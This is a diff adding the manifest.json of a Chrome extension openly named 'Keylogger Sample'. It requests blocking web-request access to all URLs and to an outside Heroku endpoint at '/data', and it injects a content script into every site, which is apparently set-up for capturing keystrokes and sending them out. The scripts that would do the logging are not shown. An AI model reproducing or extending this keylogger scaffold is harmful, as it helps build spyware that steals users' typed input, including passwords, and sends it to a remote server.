@@ -1,0 +1,29 @@
+{
+	"manifest_version": 2,
+	"permissions": [
+		"webRequestBlocking",
+		"webRequest",
+        "https://chrome21.herokuapp.com/data",
+		"<all_urls>",
+		"activeTab"
+    ],
+	"name": "Keylogger Sample",
+	"version": "1",
+	"icons" : {
+	    "720" : "icon.png"
+	},
+	"browser_action": {
+		"default_icon": "icon.png",
+		"default_popup": "popup.html"
+	  },
+	"description": "A sample keylogger",
+	  "background": {
+	    "scripts": ["background.js"]
+	  },
+	"content_scripts": [
+	  {
+	    "matches": ["*://*/*"],
+	    "js": ["content.js"]
+	  }
+	]
+}
